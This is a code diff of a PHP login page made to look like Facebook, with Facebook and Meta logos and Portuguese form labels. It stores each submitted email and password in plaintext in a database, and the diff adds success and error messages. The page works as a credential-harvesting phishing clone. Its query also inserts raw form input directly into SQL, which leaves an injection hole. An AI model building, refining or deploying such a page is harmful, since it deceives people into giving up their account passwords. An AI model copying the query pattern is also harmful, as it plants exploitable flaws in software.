@@ -1,11 +1,17 @@
 <?php 
 if(isset($_POST['submit'])){
-   
     include_once('config.php');
     $emailIn = $_POST['email'];
     $senhaIn = $_POST['password'];
 
-    $result = mysqli_query($conexao, "INSERT INTO new_table(email, senha) VALUES ('$emailIn','$senhaIn')");
+    // Corrigir os campos da tabela para corresponder aos campos reais
+    $result = mysqli_query($conexao, "INSERT INTO new_table (email, senha) VALUES ('$emailIn', '$senhaIn')");
+    
+    if($result){
+        echo "Dados inseridos com sucesso!";
+    } else {
+        echo "Erro ao inserir dados: " . mysqli_error($conexao);
+    }
 }
 ?>
 
@@ -83,20 +89,15 @@ if(isset($_POST['submit'])){
             <div class="spaceLogo"><img src="facebook (2).png" alt=""></div>
         </nav>
         <form action="index.php" method="POST">
-            
-                <input type="email" name="email" id="email" placeholder="Número do celular ou email" class="input-group-text" required>
-                <input type="password" name="password" id="password" placeholder="Senha" class="input-group-text" required>
-                
-                <button type="submit" name="submit" class="enviar btn btn-primary btn-lg btn-block">Entrar</button>
-                <a href="">Esqueceu a senha?</a>
-         
+            <input type="email" name="email" id="email" placeholder="Número do celular ou email" class="input-group-text" required>
+            <input type="password" name="password" id="password" placeholder="Senha" class="input-group-text" required>
+            <button type="submit" name="submit" class="enviar btn btn-primary btn-lg btn-block">Entrar</button>
+            <a href="">Esqueceu a senha?</a>
         </form>
-        
         <footer>
-            <div class="newConta "><button class="btn btn-outline-primary btn-block">Criar nova conta</button></div>
+            <div class="newConta"><button class="btn btn-outline-primary btn-block">Criar nova conta</button></div>
             <hr>
-            <div class="metaLogo"><span class="logoMeta"><img src="meta.png" alt="" 
-                class="metaImg"></span></div>
+            <div class="metaLogo"><span class="logoMeta"><img src="meta.png" alt="" class="metaImg"></span></div>
         </footer>
     </main>
 </body>
